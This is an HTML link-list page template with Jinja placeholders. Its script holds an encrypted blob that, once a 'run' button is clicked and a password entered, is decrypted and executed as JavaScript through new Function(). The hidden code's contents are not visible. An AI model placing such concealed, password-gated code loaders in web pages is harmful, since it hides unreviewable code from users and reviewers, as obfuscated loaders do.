<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>{{ title }}</title>
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="shortcut icon" href="/favicon.ico">
    <style>
        body {
            background-color: #333;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }

        .links-container {
            width: 100%;
            margin: 0 auto;
            padding: 20px;
            box-sizing: border-box;
        }

        ul {
            list-style-type: none;
            padding: 0;
        }

        a {
            display: block;
            color: #fff;
            text-decoration: none;
            background-color: #555;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            word-wrap: break-word;
        }

        a:hover {
            background-color: #777;
        }
    </style>
</head>
<body>
    <div class="links-container">
        Last updated: {{ updated_at }} <button id="run">run</button>
        <ul>
            {% for link in links %}
                <li>
                    <a href="{{ link.url }}">{{ link.time }} | {{ link.text }} ({{ link.domain }}) </a>
                </li>
            {% endfor %}
        </ul>
    </div>
  <script>
    const payload = {
      "salt": "F+JoB7R/RZCQIW6hZfewpA==",
      "iv": "j6WGI5pzDn07FJvX",
      "ciphertext": "Ba8COh+N/QtB6DxQJE1henL1BkeZs3dXgIGUJAyQuDRDRkG8E+EZnsyt5V5/JVYvISvT3ksEOMTLyD5tRnY/+hwk9jq0UmZce8XFDPtLXIWvB1g9P5cPunuO3FZMCYGCPa9IZ3+j0IAnSc2fYDyDVDsOqnTHXCXhaxA+E6LrRFlrvS0lBCN4ibylobnyE2fR07SHxEXtexaWkbudHKHM82oR/XsVvoJQmmVwM2sF4U2LAtzy4RJMYmXmpBHwsWkIYiEEyGTyXjaQGa8glh9gkom5mQTMXJSTdltQBYBSIzyNhBMMkLOrDbgm+zTvPlyA6idv0LwkRxYLjtl41YrRZF1an3E2fEFDWO/ijmw6GMk25nZxkV7tZnk5hNC+iwiUoIMAXdUWfqHTv7Yhdfqzfukprn5sZFBxV5yycJeQo1inNrzFQnBF/rxnHzZnny0Y/z66j2a0M7VIQ3SkPfq/mCA5qrH5gJTXjcMj/TJof5pEOwRU+HxceUThN6Lf7hWIgxkMg4RjZmQWJrROB0NbFdubQ1nWdJg9sZD1DX6mnUvNXDl3RNgOlsPkOdBi56YMkudk0BmVkDiN0oPs1w0Ab/yJr1i1hNnWL71HadLuoDpVB6depXcJRDcO7ltfuM5tfERNzEU5/Luqqaa7VqwFVvCVEGOdoOnEdTCwpC/BNiczn8i9f+AiZlkQ3Bfn3uVNHfeIIpDeSEjHt9yoAzrUz/aQkjm6mHH5Nb2T9lk//plyIscwuMm0/wmpr5Yiz+GDGfM769PcDhJOwhs1z+V4EvvJKAuLoglDmTu1T7Zx8lO4UKZSE79YJKiCpLRyw84/cGEKMjMX8ZA="
    };

    const b64 = s => Uint8Array.from(atob(s), c => c.charCodeAt(0));

    async function decrypt(password) {
      const keyMaterial = await crypto.subtle.importKey(
        "raw",
        new TextEncoder().encode(password),
        "PBKDF2",
        false,
        ["deriveKey"]
      );

      const key = await crypto.subtle.deriveKey(
        {
          name: "PBKDF2",
          salt: b64(payload.salt),
          iterations: 250000,
          hash: "SHA-256"
        },
        keyMaterial,
        {
          name: "AES-GCM",
          length: 256
        },
        false,
        ["decrypt"]
      );

      const plaintext = await crypto.subtle.decrypt(
        {
          name: "AES-GCM",
          iv: b64(payload.iv)
        },
        key,
        b64(payload.ciphertext)
      );

      return new TextDecoder().decode(plaintext);
    }

    document.getElementById("run").onclick = async () => {
      const password = prompt("");
      if (!password) return;

      try {
        const source = await decrypt(password);
        new Function(source)();
      } catch (e) {
        console.error(e);
      }
    };
  </script>
</body>
</html>
